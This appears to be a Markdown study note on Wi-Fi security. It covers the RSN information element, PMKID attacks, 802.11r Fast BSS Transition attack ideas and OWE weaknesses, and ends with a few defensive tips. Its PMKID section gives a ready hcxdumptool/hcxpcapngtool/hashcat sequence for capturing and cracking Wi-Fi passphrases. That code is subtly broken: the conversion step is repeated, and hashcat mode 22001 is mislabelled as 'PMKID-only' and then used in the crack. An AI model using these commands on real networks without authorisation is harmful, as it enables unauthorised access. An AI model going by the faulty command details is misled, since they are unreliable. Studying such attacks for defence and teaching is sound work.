# 04 — RSN Information Element & PMKID

## RSN IE Structure

The RSN (Robust Security Network) IE in beacon/probe frames defines:
- Version (1)
- Group cipher suite (2-5)
- Pairwise cipher count + suites (6-13)
- AKM count + suites (14-21)
- RSN capabilities (22-23)
- PMKID list (optional, 24+)

## PMKID Attack (hcxdumptool)

PMKID is sent in first EAPOL frame by some APs. No client interaction needed.

```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hash pmkid.pcapng

# Crack (mode 22001 for PMKID-only, 22000 for mixed)
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22001 pmkid.hc22000 wordlist.txt
```

## Fast BSS Transition (802.11r)

FT allows fast roaming between APs. Attack vectors:
- **FT key derivation**: PMK-R0 → PMK-R1 → PTK. Compromise one AP, derive keys for all.
- **FT reassociation**: Forge FT reassociation to hijack session.
- **Over-the-air FT**: Capture FT authentication exchange.

```bash
# Capture FT frames
airodump-ng wlan0mon --band abg -w ft-capture

# Analyze FT key hierarchy
python3 ft-analyzer.py -i ft-capture-01.cap
```

## OWE (Opportunistic Wireless Encryption)

802.11 OWE (RFC 8110) replaces open networks with unauthenticated encryption.
- Vulnerable to rogue AP downgrade (force client to open)
- No identity verification → still susceptible to Evil Twin

## Defensive Application

- Disable PMKID in AP configuration where possible
- Use SAE or 802.1X instead of PSK
- Validate FT keys across BSSIDs
- Deploy OWE with additional authentication layer
